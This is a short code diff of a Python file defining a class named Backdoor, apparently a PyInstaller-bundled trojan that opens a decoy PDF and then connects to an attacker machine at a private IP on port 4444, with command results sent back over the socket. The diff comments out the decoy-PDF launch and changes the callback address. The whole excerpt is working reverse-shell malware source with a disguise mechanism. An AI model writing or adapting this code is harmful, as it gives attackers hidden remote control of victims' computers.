@@ -81,11 +81,11 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-file_name = sys._MEIPASS + "\sample.pdf"
+# file_name = sys._MEIPASS + "\sample.pdf"
 # MEIPASS : This is the path attribution created by pyinstaller, it is quite useful when you have some resource files (like .bmp .png) to load in your python one-file-bundled app.
-subprocess.Popen(file_name, shell=True)
+# subprocess.Popen(file_name, shell=True)
 try:
-    my_backdoor = Backdoor("192.168.189.130", 4444)
+    my_backdoor = Backdoor("192.168.189.133", 4444)
     my_backdoor.start()
 except Exception:
     sys.exit()
